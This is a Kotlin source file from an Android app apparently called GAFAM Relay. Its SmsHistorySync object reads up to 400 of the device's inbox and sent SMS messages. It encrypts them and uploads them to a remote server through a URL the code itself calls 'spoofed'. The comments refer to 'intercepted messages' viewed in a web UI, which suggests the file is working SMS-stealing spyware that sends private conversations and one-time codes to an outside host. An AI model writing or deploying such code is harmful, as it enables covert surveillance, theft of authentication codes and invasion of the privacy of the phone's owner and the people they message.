package com.gafam.relay

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import kotlin.concurrent.thread

/**
 * Pushes recent device SMS (inbox + sent) to the VPC so the web UI
 * can show ongoing conversations, not only newly intercepted messages.
 */
object SmsHistorySync {
    private const val TAG = "GAFAM_Relay"
    private const val MAX_MESSAGES = 400
    private const val MIN_INTERVAL_MS = 10 * 60 * 1000L // 10 min

    private val syncing = AtomicBoolean(false)
    private val lastSyncAt = AtomicLong(0)

    fun syncAsync(context: Context, force: Boolean = false) {
        thread(name = "gafam-sms-history", isDaemon = true) {
            sync(context.applicationContext, force)
        }
    }

    fun sync(context: Context, force: Boolean = false) {
        if (!force) {
            val last = lastSyncAt.get()
            if (last > 0 && System.currentTimeMillis() - last < MIN_INTERVAL_MS) return
        }
        if (!syncing.compareAndSet(false, true)) return
        try {
            doSync(context)
            lastSyncAt.set(System.currentTimeMillis())
        } catch (e: Exception) {
            Log.e(TAG, "SMS history sync failed", e)
            LogShipper.event(context, "E", "sms_sync", "History sync failed: ${e.message}")
        } finally {
            syncing.set(false)
        }
    }

    private fun doSync(context: Context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "READ_SMS missing — skip history sync")
            return
        }

        val prefs = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        val messages = JSONArray()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms"),
            arrayOf("address", "body", "date", "type"),
            "type IN (1,2)",
            null,
            "date DESC LIMIT $MAX_MESSAGES"
        )

        cursor?.use {
            val addrIdx = it.getColumnIndex("address")
            val bodyIdx = it.getColumnIndex("body")
            val dateIdx = it.getColumnIndex("date")
            val typeIdx = it.getColumnIndex("type")
            while (it.moveToNext()) {
                val address = it.getString(addrIdx) ?: continue
                val body = it.getString(bodyIdx) ?: ""
                val date = it.getLong(dateIdx)
                val type = it.getInt(typeIdx)
                if (address.isBlank() || body.isBlank()) continue
                messages.put(JSONObject().apply {
                    put("address", address)
                    put("body", body)
                    put("timestamp", date)
                    put("type", type) // 1=inbox, 2=sent
                })
            }
        }

        if (messages.length() == 0) {
            Log.d(TAG, "No SMS history to sync")
            return
        }

        val plaintext = JSONObject().put("messages", messages).toString().toByteArray(Charsets.UTF_8)
        val digest = java.security.MessageDigest.getInstance("SHA-256")
        val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
        val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12)
        java.security.SecureRandom().nextBytes(iv)
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, javax.crypto.spec.GCMParameterSpec(128, iv))
        val ciphertext = cipher.doFinal(plaintext)

        val encryptedPayload = JSONObject().apply {
            put("encrypted_data", android.util.Base64.encodeToString(ciphertext, android.util.Base64.NO_WRAP))
            put("iv", android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP))
        }

        val client = ApiClient.getClient(context) ?: return
        val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/sync")
        val request = Request.Builder()
            .url(spoofedUrl)
            .post(encryptedPayload.toString().toRequestBody("application/json".toMediaType()))
            .addHeader("Authorization", "Bearer $jwtSecret")
            .build()

        val response = client.newCall(request).execute()
        val code = response.code
        response.close()
        if (code in 200..299) {
            Log.d(TAG, "SMS history synced (${messages.length()} msgs)")
            LogShipper.event(context, "I", "sms_sync", "Synced ${messages.length()} recent SMS to VPC")
        } else {
            Log.w(TAG, "SMS history sync HTTP $code")
            LogShipper.event(context, "W", "sms_sync", "History sync HTTP $code")
        }
    }
}
